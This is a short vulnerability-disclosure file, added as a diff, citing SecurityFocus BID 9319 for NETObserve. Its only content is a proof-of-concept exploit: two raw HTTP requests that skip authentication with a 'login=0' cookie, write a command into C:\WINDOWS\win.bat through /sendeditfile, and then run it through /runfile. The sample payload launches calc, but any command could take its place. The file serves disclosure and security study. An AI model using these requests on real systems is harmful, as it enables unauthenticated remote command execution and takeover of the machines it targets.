@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/9319/info
+
+NETObserve is prone to a vulnerability that may permit remote unauthenticated users to access functions of the software. Due to the nature of the software, this could permit an attacker to execute commands remotely on an underlying system running the software. This may also expose privileged information about the system and its users. Successful exploitation will result in remote compromise of the system. 
+
+REQUEST #1:
+
+--------------------------------------------------------------------------
+POST /sendeditfile HTTP/1.1
+Accept: */*
+Referer: http://127.0.0.1/editfile=?C:\WINDOWS\win.bat?
+Content-Type: application/x-www-form-urlencoded
+Host: AnyHostWillDo
+Content-Length: 25
+Cookie: login=0
+
+newfiledata=cmd+%2Fc+calc
+--------------------------------------------------------------------------
+
+REQUEST #2:
+
+--------------------------------------------------------------------------
+GET /runfile=?C:\windows\win.bat? HTTP/1.1
+Accept: */*
+Host: AnyHostWillDo
+Cookie: login=0
+
+
+-------------------------------------------------------------------------- 
